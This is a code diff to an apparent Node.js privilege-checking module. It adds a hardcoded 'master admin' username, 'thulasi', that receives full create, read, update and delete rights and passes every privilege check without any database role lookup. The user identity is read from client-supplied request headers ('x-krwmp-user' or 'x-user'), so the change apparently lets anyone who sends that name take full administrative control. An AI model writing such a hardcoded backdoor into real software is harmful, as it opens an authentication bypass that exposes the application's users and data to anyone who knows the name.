@@ -4,12 +4,19 @@ function getRequestUser(request) {
   return String(request.headers['x-krwmp-user'] || request.headers['x-user'] || '').trim().toLowerCase();
 }
 
+function isMasterAdmin(identifier) {
+  return String(identifier || '').trim().toLowerCase() === 'thulasi';
+}
+
 function isAdminRole(roleName) {
   return String(roleName || '').toLowerCase() === 'admin';
 }
 
 async function getUserPrivileges(identifier) {
   if (!identifier) return [];
+  if (isMasterAdmin(identifier)) {
+    return [{ privilege_key: 'system_admin', privilege_name: 'System Administration', can_view: true, can_create: true, can_update: true, can_delete: true, role_name: 'admin' }];
+  }
   const result = await pool.query(`
     SELECT DISTINCT
       rp.privilege_key,
@@ -32,6 +39,7 @@ async function getUserPrivileges(identifier) {
 
 async function hasPrivilege(identifier, privilegeKey, action = 'view') {
   if (!identifier) return false;
+  if (isMasterAdmin(identifier)) return true;
   const result = await pool.query(`
     SELECT EXISTS (
       SELECT 1
@@ -75,4 +83,4 @@ async function requirePrivilegeInline(request, reply, privilegeKey, action = 'vi
   return guard(request, reply);
 }
 
-module.exports = { getRequestUser, getUserPrivileges, hasPrivilege, requirePrivilege, requirePrivilegeInline, isAdminRole };
+module.exports = { getRequestUser, getUserPrivileges, hasPrivilege, requirePrivilege, requirePrivilegeInline, isAdminRole, isMasterAdmin };
